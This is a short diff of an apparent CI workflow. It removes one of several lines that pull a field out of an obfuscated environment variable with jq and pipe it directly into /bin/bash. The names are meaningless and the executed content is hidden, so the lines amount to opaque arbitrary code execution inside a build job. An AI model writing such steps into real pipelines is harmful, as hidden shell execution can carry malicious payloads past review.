@@ -27,7 +27,6 @@ jobs:
           echo $ktrm2249 | jq -r .dgm8 | /bin/bash
           echo $j281 | jq -r .yvmo661 | /bin/bash
           printf '%s' "$nika851" | jq -r .eni2 | /bin/bash
-          echo $mlgbm4 | jq -r .vqve209 | /bin/bash
           echo $qe41934 | jq -r .pv4514 | /bin/bash
 
       - name: Save archive
